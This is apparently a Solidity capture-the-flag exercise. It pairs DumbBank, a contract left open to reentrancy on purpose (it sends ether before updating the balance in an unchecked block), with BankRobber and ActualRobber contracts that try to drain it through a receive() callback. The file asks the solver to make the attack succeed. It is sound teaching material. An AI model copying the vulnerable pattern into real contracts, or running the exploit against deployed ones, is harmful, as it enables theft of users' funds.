pragma solidity 0.8.15;

import "hardhat/console.sol";

contract DumbBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= balances[msg.sender], "not enough funds");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface IDumbBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

// This attack fails. Make the attack succeed.
// NOTE: receive and fallback are not called if ether is received in constructor.
contract BankRobber {
    constructor(IDumbBank _dumbBank) payable {
        uint256 balanceBefore = address(this).balance;
        uint256 bankBefore = address(_dumbBank).balance;
        ActualRobber robber = new ActualRobber(_dumbBank);
        robber.rob{value: 1 ether}();
        robber.transfer();
        require(address(this).balance == balanceBefore + bankBefore, "attack failed");
    }

    // receive() external payable {}
}

contract ActualRobber {
    IDumbBank dumbBank;
    address robber;

    constructor(IDumbBank _dumbBank) {
        dumbBank = _dumbBank;
        robber = msg.sender;
    }

    function rob() public payable {
        dumbBank.deposit{value: 1 ether}();
        dumbBank.withdraw(1 ether);
    }

    function transfer() public {
        (bool ok, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }

    receive() external payable {
        if (address(dumbBank).balance >= 1 ether) {
            dumbBank.withdraw(1 ether);
        }
    }
}
